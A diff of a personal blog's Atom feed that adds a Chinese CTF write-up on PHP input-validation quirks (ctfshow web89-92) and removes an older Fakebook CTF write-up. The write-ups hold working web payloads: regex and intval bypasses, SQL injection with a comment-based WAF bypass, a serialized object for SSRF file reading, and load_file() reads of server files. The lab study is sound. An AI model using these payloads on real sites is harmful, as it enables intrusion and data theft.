@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://lingxin16.github.io/"/>
-  <updated>2021-01-21T15:51:35.063Z</updated>
+  <updated>2021-01-22T15:19:55.710Z</updated>
   <id>https://lingxin16.github.io/</id>
   
   <author>
@@ -15,6 +15,36 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>ctfshow-web入门PHP特性</title>
+    <link href="https://lingxin16.github.io/2021/01/22/ctfshow-web%E5%85%A5%E9%97%A8PHP%E7%89%B9%E6%80%A7/"/>
+    <id>https://lingxin16.github.io/2021/01/22/ctfshow-web%E5%85%A5%E9%97%A8PHP%E7%89%B9%E6%80%A7/</id>
+    <published>2021-01-22T13:44:05.000Z</published>
+    <updated>2021-01-22T15:19:55.710Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="web89"><a href="#web89" class="headerlink" title="web89"></a>web89</h3><pre><code>&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-16 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-09-18 15:38:51# @email: h1xa@ctfer.com# @link: https://ctfer.com*/include(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#39;num&#39;])){    $num = $_GET[&#39;num&#39;];    if(preg_match(&quot;/[0-9]/&quot;, $num)){        die(&quot;no no no!&quot;);    }    if(intval($num)){        echo $flag;    }}</code></pre><p>get方式传入num参数，然后通过preg_match判断是否存在数字，如果存在，就die，不存在的话然后intval函数判断整数，通过数组绕过preg_match，因为preg_match无法处理数组，所以payload：</p><p><code>?num[]=1</code></p><h3 id="web90"><a href="#web90" class="headerlink" title="web90"></a>web90</h3><pre><code>&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-16 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-09-18 16:06:11# @email: h1xa@ctfer.com# @link: https://ctfer.com*/include(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#39;num&#39;])){    $num = $_GET[&#39;num&#39;];    if($num===&quot;4476&quot;){        die(&quot;no no no!&quot;);    }    if(intval($num,0)===4476){        echo $flag;    }else{        echo intval($num,0);    }}</code></pre><p>get方式传入num，如果num===4476就die，然后intval判断num，这里看intval函数</p><pre><code>intval(PHP 4, PHP 5, PHP 7)intval — 获取变量的整数值说明int intval( mixed $var[, int $base = 10] )通过使用指定的进制 base 转换（默认是十进制），返回变量 var 的 integer 数值。 intval() 不能用于 object，否则会产生 E_NOTICE 错误并返回 1。 参数var要转换成 integer 的数量值 base转化所使用的进制 Note: 如果 base 是 0，通过检测 var 的格式来决定使用的进制： • 如果字符串包括了 &quot;0x&quot; (或 &quot;0X&quot;) 的前缀，使用 16 进制 (hex)；否则，  • 如果字符串以 &quot;0&quot; 开始，使用 8 进制(octal)；否则，  • 将使用 10 进制 (decimal)。</code></pre><p>所以intval是支持不同的进制的，这里base指定是0，那么intval会根据我们输入情况使用进制，</p><p>所以这里我就就可以用16进制或八进制表示4476</p><pre><code>?num=0×117c    //十六进制?num=010574    //八进制</code></pre><p>还有看下边的例子</p><pre><code>&lt;?php echo intval(&#39;a123&#39;);echo &#39;-&#39;;echo intval(123);echo &#39;-&#39;;echo intval(&#39;123a&#39;);?&gt;//0-123-123</code></pre><p>intval取的是我们所输入内容开头的整数，也就是说我们传入含有字符的字符串，例如<code>?num=4476a</code>,那么intval(“4476a”)也等于4476</p><p>所以payload</p><pre><code>?num=0x117c    //十六进制?num=010574    //八进制?num=4476a    //字符串</code></pre><h3 id="web91"><a href="#web91" class="headerlink" title="web91"></a>web91</h3><pre><code>&lt;?php/*# -*- coding: utf-8 -*-# @Author: Firebasky# @Date:   2020-09-16 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-09-18 16:16:09# @link: https://ctfer.com*/show_source(__FILE__);include(&#39;flag.php&#39;);$a=$_GET[&#39;cmd&#39;];if(preg_match(&#39;/^php$/im&#39;, $a)){    if(preg_match(&#39;/^php$/i&#39;, $a)){        echo &#39;hacker&#39;;    }    else{        echo $flag;    }}else{    echo &#39;nonononono&#39;;}</code></pre><p>看两个preg_match的差别</p><p>第一个preg_match(‘/^php$/im’, $a)</p><p>第二个preg_match(‘/^php$/i’, $a)</p><p>差别就在于第一个preg_match多了个/m,/m表示匹配多行数据，就是输入的每一行都被匹配，所以我们可以通过换行(%0a)绕过，最终payload<code>?cmd=1%0aphp</code></p><h3 id="web92"><a href="#web92" class="headerlink" title="web92"></a>web92</h3><pre><code>&lt;?php/*# -*- coding: utf-8 -*-# @Author: Firebasky# @Date:   2020-09-16 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-09-18 16:29:30# @link: https://ctfer.com*/include(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#39;num&#39;])){    $num = $_GET[&#39;num&#39;];    if($num==4476){        die(&quot;no no no!&quot;);    }    if(intval($num,0)==4476){        echo $flag;    }else{        echo intval($num,0);    }}</code></pre><p>首先要求num!=4476,然后intval($num,0)==4476</p><p>八进制和十六进制还是可行的</p><pre><code>?num=0x117c    //十六进制?num=010574    //八进制</code></pre>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h3 id=&quot;web89&quot;&gt;&lt;a href=&quot;#web89&quot; class=&quot;headerlink&quot; title=&quot;web89&quot;&gt;&lt;/a&gt;web89&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1
+      
+    
+    </summary>
+    
+    
+      <category term="刷题记录" scheme="https://lingxin16.github.io/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
+    
+    
+      <category term="web" scheme="https://lingxin16.github.io/tags/web/"/>
+    
+  </entry>
   
   <entry>
     <title>ctfshow-web入门文件包含</title>
@@ -461,29 +491,6 @@
     <summary type="html">
     
       &lt;p&gt;题目地址：&lt;a href=&quot;https://buuoj.cn/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;buuctf&lt;/a&gt;&lt;/p&gt;
-    
-    </summary>
-    
-    
-      <category term="刷题记录" scheme="https://lingxin16.github.io/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
-    
-    
-      <category term="web" scheme="https://lingxin16.github.io/tags/web/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>网鼎杯2018-Fakebook</title>
-    <link href="https://lingxin16.github.io/2020/06/20/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Fakebook/"/>
-    <id>https://lingxin16.github.io/2020/06/20/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Fakebook/</id>
-    <published>2020-06-20T14:27:00.000Z</published>
-    <updated>2020-07-15T09:48:16.193Z</updated>
-    
-    <content type="html"><![CDATA[<p>题目地址:<a href="https://buuoj.cn/" target="_blank" rel="noopener">buuctf</a></p><a id="more"></a><p>打开题目</p><p><img data-action="zoom" src="/2020/06/20/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Fakebook/1.png" alt="1"></p><p>the Fakebook</p><p>有login和join两个选项，join应该是注册，我们先尝试注册</p><p>注册成功之后直接登录</p><p><img data-action="zoom" src="/2020/06/20/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Fakebook/2.png" alt="2"></p><p>username这里可以点进去，进去之后是这样的</p><p><img data-action="zoom" src="/2020/06/20/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Fakebook/3.png" alt="3"></p><p>url格式是/view.php?no=1，猜测可以进行注入</p><p>当我们尝试进行注入的时候，发现有waf，当出现有union select的时候就会被拦截</p><p>这里用/**/代替空格进行绕过</p><p>/view.php?no=0 union/**/select 1,2,3,4–+的时候回显</p><p><img data-action="zoom" src="/2020/06/20/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Fakebook/4.png" alt="4"></p><p>/view.php?no=0 union/**/select 1,database(),3,4–+得到数据库名fakebook</p><p><img data-action="zoom" src="/2020/06/20/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Fakebook/5.png" alt="5"></p><p>/view.php?no=0 union/**/select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=’fakebook’–+得到表名user</p><p><img data-action="zoom" src="/2020/06/20/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Fakebook/6.png" alt="6"></p><p>/view.php?no=0 union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_schema=’fakebook’ and table_name=’users’–+得到列名</p><p><img data-action="zoom" src="/2020/06/20/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Fakebook/7.png" alt="7"></p><p>/view.php?no=0 union/**/select 1,group_concat(no,username,passwd,data),3,4 from fakebook.users –+得到数据</p><p><img data-action="zoom" src="/2020/06/20/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Fakebook/8.png" alt="8"></p><p>1d1a05b40f186efa8c4152341eb69a1c8ac32ea0c3d76d6d071427a902ed8ec88c320f54ca1d4e8301a9a43746c74826d2c9113dc30ff93a68e7eda21aa5d94ab4e69O:8:”UserInfo”:3:{s:4:”name”;s:4:”d1a0”;s:3:”age”;i:111;s:4:”blog”;s:11:”<a href="http://www.d1a0.cn&quot;;}" target="_blank" rel="noopener">www.d1a0.cn&quot;;}</a> </p><p>这里我们并没有得到flag，而是我们个人资料的反序列化数据，因为在数据中存在我们的博客地址，所以我们尝试使用ssrf读取flag，但是我们并不知道flag所在文件夹，用dirsearch扫描发现flag.php和robots.txt</p><p>robots.txt中存在</p><pre><code>User-agent: *Disallow: /user.php.bak</code></pre><p>下载得到</p><pre><code class="PHP">&lt;?phpclass UserInfo{    public $name = &quot;&quot;;    public $age = 0;    public $blog = &quot;&quot;;    public function __construct($name, $age, $blog)    {        $this-&gt;name = $name;        $this-&gt;age = (int)$age;        $this-&gt;blog = $blog;    }    function get($url)    {        $ch = curl_init();        curl_setopt($ch, CURLOPT_URL, $url);        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);        $output = curl_exec($ch);        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);        if($httpCode == 404) {            return 404;        }        curl_close($ch);        return $output;    }    public function getBlogContents ()    {        return $this-&gt;get($this-&gt;blog);    }    public function isValidBlog ()    {        $blog = $this-&gt;blog;        return preg_match(&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i&quot;, $blog);    }}</code></pre><p>构造payload</p><pre><code class="PHP">&lt;?phpclass Userinfo{    public $name = &quot;d1a0&quot;;    public $age = 111;    public $blog = &quot;file:///var/www/html/flag.php&quot;;}$data = new Userinfo();echo serialize($data);?&gt;</code></pre><p>/view.php?no=0 union/**/select 1,2,3,’O:8:”Userinfo”:3:{s:4:”name”;s:4:”d1a0”;s:3:”age”;i:111;s:4:”blog”;s:29:”file:///var/www/html/flag.php”;}’</p><p><img data-action="zoom" src="/2020/06/20/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Fakebook/9.png" alt="9"></p><p>看大佬们的博客，还有个非预期解</p><p>使用load_file()函数，直接得到flag，不过前提是知道flag文件位置 </p><p>payload：/view.php?no=0 union/**/select 1,load_file(‘/var/www/html/flag.php’),3,4</p><p>太棒了，又学到了许多<img data-action="zoom" src="/2020/06/20/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Fakebook/10.jpg" alt="10"></p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;题目地址:&lt;a href=&quot;https://buuoj.cn/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;buuctf&lt;/a&gt;&lt;/p&gt;
     
     </summary>
     
